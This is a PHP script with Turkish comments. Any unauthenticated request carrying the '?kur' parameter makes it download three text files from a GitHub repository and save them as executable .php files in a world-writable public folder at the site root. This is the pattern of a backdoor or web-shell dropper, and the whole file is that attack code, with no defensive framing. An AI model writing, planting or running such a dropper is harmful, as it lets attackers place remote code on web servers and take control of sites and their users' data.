<?php
// URL'de ?kur parametresi var mı kontrol et
if (isset($_GET['kur'])) {
    // İndirilecek dosyalar
    $files = [
        'https://raw.githubusercontent.com/necessaryfor/all/refs/heads/main/manager1s.txt',
        'https://raw.githubusercontent.com/necessaryfor/all/refs/heads/main/yeah.txt',
        'https://raw.githubusercontent.com/necessaryfor/all/refs/heads/main/manager.txt',
    ];

    // Hedef dizin: sitenin kök dizinindeki public klasörü
    $rootDir = realpath(__DIR__ . '/../../'); // Kök dizini al
    $targetDir = $rootDir . '/public'; // public klasörüne ulaş

    // Eğer public klasörü yoksa oluşturalım
    if (!file_exists($targetDir)) {
        mkdir($targetDir, 0777, true);
    }

    // Dosyaları indir, adını değiştir ve kopyala
    foreach ($files as $file) {
        // Dosya adını al
        $fileName = basename($file, '.txt') . '.php';

        // İndirilen dosya için hedef yol
        $targetFilePath = $targetDir . '/' . $fileName;

        // Dosyayı indir
        $fileContent = file_get_contents($file);

        // İndirilen içeriğin boş olup olmadığını kontrol et
        if ($fileContent === false || empty($fileContent)) {
            echo "Dosya indirilemedi veya içeriği boş: $file<br>";
            continue;
        }

        // İndirilen içeriği .php uzantısı ile kaydet
        $isSaved = file_put_contents($targetFilePath, $fileContent);

        // Dosyanın gerçekten kaydedildiğini kontrol et
        if ($isSaved === false) {
            echo "Dosya kaydedilemedi: $targetFilePath<br>";
            continue;
        }

        // Kaydedilen dosyanın içeriğini kontrol et (boşsa hata ver)
        $savedContent = file_get_contents($targetFilePath);
        if (empty($savedContent)) {
            echo "Dosya oluşturuldu ancak içeriği boş: $targetFilePath<br>";
        } else {
            // Kopyalanan dosyanın yolunu yazdır
            echo "Dosya başarıyla oluşturuldu: " . $targetFilePath . "<br>";
        }
    }
} else {
    echo "Geçersiz istek. ?kur parametresi gerekli.";
}
?>
